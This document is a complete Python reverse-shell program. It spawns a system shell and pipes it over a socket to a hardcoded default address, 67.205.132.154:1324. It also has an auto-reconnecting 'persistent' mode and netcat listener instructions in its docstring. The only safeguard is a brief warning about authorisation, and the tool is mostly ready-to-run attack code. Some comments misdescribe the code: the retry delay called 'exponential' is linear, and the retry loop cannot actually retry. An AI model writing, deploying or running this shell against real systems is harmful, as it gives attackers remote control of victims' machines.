#!/usr/bin/env python3
"""
Python Reverse Shell - Auto Mode
================================

This is a simple reverse shell written in Python that automatically connects
back to a listening server and provides remote command execution capabilities.

⚠️  WARNING: This tool should only be used for educational purposes or with
explicit permission on systems you own or have authorization to test.

🚀 AUTOMATIC MODE: By default, runs in persistent mode with automatic reconnection.

Usage:
    uv run reverse-shell                    # Auto-connect to default (persistent)
    uv run reverse-shell <host> <port>      # Auto-connect to custom (persistent)
    uv run reverse-shell --once             # Run once and exit
    python -m reverse_shell                 # Same as above

Examples:
    uv run reverse-shell                    # Auto-connects to 67.205.132.154:1324
    uv run reverse-shell 192.168.1.100 8080 # Auto-connects to custom address
    uv run reverse-shell --once             # Connects once and exits

Default connection: 67.205.132.154:1324 (persistent mode)

On the listening server, you can use netcat:
    nc -lvnp 1324

Or with ncat:
    ncat -lvnp 1324
"""

import socket
import subprocess
import sys
import os
import platform
import select


def get_shell_command():
    """Get the appropriate shell command for the current platform."""
    system = platform.system().lower()

    if system == "windows":
        return ["cmd.exe"]
    else:
        # Try different shells in order of preference for Unix-like systems
        shells = ["/bin/bash", "/bin/sh", "/usr/bin/bash", "/usr/bin/sh"]
        for shell in shells:
            if os.path.exists(shell):
                return [shell]
        return ["/bin/sh"]  # fallback


def create_socket(host, port):
    """Create and connect a socket to the remote host."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((host, port))
        return sock
    except socket.error as e:
        print(f"Failed to connect to {host}:{port} - {e}", file=sys.stderr)
        sys.exit(1)


def handle_connection(sock):
    """Handle the bidirectional communication between socket and shell."""
    try:
        # Start the shell process
        shell_cmd = get_shell_command()
        process = subprocess.Popen(
            shell_cmd,
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            shell=False
        )

        print(f"Connected to remote host. Shell: {' '.join(shell_cmd)}")

        # Set up polling for I/O
        sockets_list = [sock]
        pipes_list = [process.stdout, process.stderr]

        while True:
            # Use select to wait for data on socket or pipes
            readable, _, _ = select.select(
                sockets_list + pipes_list, [], [], 0.1
            )

            # Check if there's data from the socket (commands from remote)
            if sock in readable:
                try:
                    data = sock.recv(4096)
                    if not data:
                        # Connection closed by remote
                        break
                    # Send command to shell
                    process.stdin.write(data)
                    process.stdin.flush()
                except socket.error:
                    break

            # Check if there's output from shell stdout
            if process.stdout in readable:
                try:
                    output = process.stdout.read(4096)
                    if output:
                        sock.send(output)
                except (OSError, BrokenPipeError):
                    break

            # Check if there's output from shell stderr
            if process.stderr in readable:
                try:
                    error_output = process.stderr.read(4096)
                    if error_output:
                        sock.send(error_output)
                except (OSError, BrokenPipeError):
                    break

            # Check if the process has terminated
            if process.poll() is not None:
                break

    except Exception as e:
        print(f"Error during connection handling: {e}", file=sys.stderr)
    finally:
        try:
            process.terminate()
            process.wait(timeout=5)
        except:
            process.kill()

        try:
            sock.close()
        except:
            pass


def main():
    """Main function to parse arguments and start the reverse shell."""
    # Default values
    default_host = "67.205.132.154"
    default_port = 1324

    # Check for flags first
    args = sys.argv[1:]
    flags = [arg for arg in args if arg.startswith('--')]
    regular_args = [arg for arg in args if not arg.startswith('--')]

    # Parse host and port from regular arguments
    if len(regular_args) == 0:
        # Use default values if no arguments provided
        host = default_host
        port = default_port
        auto_mode = True  # Default to auto mode when no args
    elif len(regular_args) == 2:
        # Use provided arguments
        host = regular_args[0]
        try:
            port = int(regular_args[1])
            if not (1 <= port <= 65535):
                raise ValueError("Port must be between 1 and 65535")
        except ValueError as e:
            print(f"Invalid port number: {e}", file=sys.stderr)
            sys.exit(1)
        auto_mode = True  # Default to auto mode
    else:
        print(f"Usage: uv run reverse-shell [<host> <port>] [--once]", file=sys.stderr)
        print("   or: python -m reverse_shell [<host> <port>] [--once]", file=sys.stderr)
        print(f"   Default: {default_host}:{default_port} (auto mode)", file=sys.stderr)
        print("   --once: Run once instead of persistent mode", file=sys.stderr)
        print(__doc__.split("Usage:")[0].strip(), file=sys.stderr)
        sys.exit(1)

    # Check for --once flag
    if "--once" in flags:
        auto_mode = False

    if auto_mode:
        print(f"Starting in persistent mode - connecting to {host}:{port}")
        run_persistent(host, port)
    else:
        print(f"Running once - connecting to {host}:{port}")
        run_once(host, port)


def run_once(host, port):
    """Run the reverse shell once."""
    print(f"Attempting to connect to {host}:{port}...")

    # Create socket and connect
    sock = create_socket(host, port)

    try:
        # Handle the connection
        handle_connection(sock)
        print("Connection closed.")
    except KeyboardInterrupt:
        print("\nReceived interrupt signal. Exiting...")
    except Exception as e:
        print(f"Unexpected error: {e}", file=sys.stderr)
    finally:
        try:
            sock.close()
        except:
            pass


def run_persistent(host, port):
    """Run the reverse shell persistently with automatic reconnection."""
    import time

    print(f"Starting persistent mode - will attempt to connect to {host}:{port}")
    print("Press Ctrl+C to stop...")

    retry_count = 0
    max_retry_delay = 300  # 5 minutes maximum delay

    while True:
        try:
            print(f"Connection attempt #{retry_count + 1} to {host}:{port}...")

            # Create socket and connect
            sock = create_socket(host, port)
            print(f"Successfully connected to {host}:{port}!")

            # Reset retry count on successful connection
            retry_count = 0

            try:
                # Handle the connection
                handle_connection(sock)
                print("Connection closed, will retry...")
            except KeyboardInterrupt:
                print("\nReceived interrupt signal. Exiting...")
                break
            except Exception as e:
                print(f"Connection error: {e}, will retry...")
            finally:
                try:
                    sock.close()
                except:
                    pass

        except socket.error as e:
            retry_count += 1
            delay = min(5 * retry_count, max_retry_delay)  # Exponential backoff
            print(f"Connection failed: {e}")
            print(f"Retrying in {delay} seconds... (attempt {retry_count})")

        except KeyboardInterrupt:
            print("\nReceived interrupt signal. Exiting...")
            break
        except Exception as e:
            retry_count += 1
            delay = min(5 * retry_count, max_retry_delay)
            print(f"Unexpected error: {e}")
            print(f"Retrying in {delay} seconds... (attempt {retry_count})")

        # Wait before retrying
        try:
            time.sleep(delay)
        except KeyboardInterrupt:
            print("\nReceived interrupt signal. Exiting...")
            break


if __name__ == "__main__":
    main()
